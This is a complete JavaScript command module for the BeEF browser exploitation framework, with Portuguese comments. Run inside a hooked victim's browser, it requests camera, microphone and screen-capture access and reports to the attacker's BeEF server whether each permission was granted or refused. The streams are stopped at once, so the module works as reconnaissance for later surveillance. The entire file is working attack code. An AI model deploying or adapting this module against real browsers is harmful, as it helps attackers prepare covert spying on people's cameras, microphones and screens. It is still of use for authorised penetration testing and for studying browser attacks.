// modules/permission_request.js

beef.execute(function() {
  function requestPermissions() {
    // Solicita acesso a câmera e microfone
    navigator.mediaDevices.getUserMedia({ audio: true, video: true })
      .then(function(stream) {
        beef.net.send('<%= @command_url %>', <%= @command_id %>, 'Permissões de câmera e microfone concedidas.');
        stream.getTracks().forEach(track => track.stop()); // libera recursos
      })
      .catch(function(error) {
        beef.net.send('<%= @command_url %>', <%= @command_id %>, 'Permissões negadas para câmera/microfone: ' + error.message);
      });

    // Solicita acesso à captura de tela
    if (navigator.mediaDevices.getDisplayMedia) {
      navigator.mediaDevices.getDisplayMedia({ video: true })
        .then(function(screenStream) {
          beef.net.send('<%= @command_url %>', <%= @command_id %>, 'Permissão para captura de tela concedida.');
          screenStream.getTracks().forEach(track => track.stop());
        })
        .catch(function(error) {
          beef.net.send('<%= @command_url %>', <%= @command_id %>, 'Permissão para captura de tela negada: ' + error.message);
        });
    } else {
      beef.net.send('<%= @command_url %>', <%= @command_id %>, 'Captura de tela não suportada neste navegador.');
    }
  }

  requestPermissions();
});
